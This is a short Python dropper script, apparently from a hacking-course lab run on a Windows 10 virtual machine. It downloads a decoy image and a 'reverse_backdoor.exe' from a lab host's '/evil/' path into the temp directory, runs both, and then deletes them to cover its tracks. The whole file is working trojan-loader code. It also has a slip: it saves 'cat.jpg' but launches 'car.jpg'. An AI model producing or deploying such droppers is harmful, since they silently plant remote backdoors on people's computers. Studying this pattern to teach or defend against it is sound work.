#!/usr/bin/env python3

# Run on the Windows 10 VM

import os  # https://docs.python.org/3/library/os.html
import requests  # https://docs.python-requests.org/en/latest/
import subprocess  # https://docs.python.org/3/library/subprocess.html
import tempfile  # https://docs.python.org/3/library/tempfile.html


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as output_file:
        output_file.write(get_response.content)


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://192.168.122.108/evil/cat.jpg")
subprocess.Popen("car.jpg", shell=True)

download("http://192.168.122.108/evil/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove("cat.jpg")
os.remove("reverse_backdoor.exe")
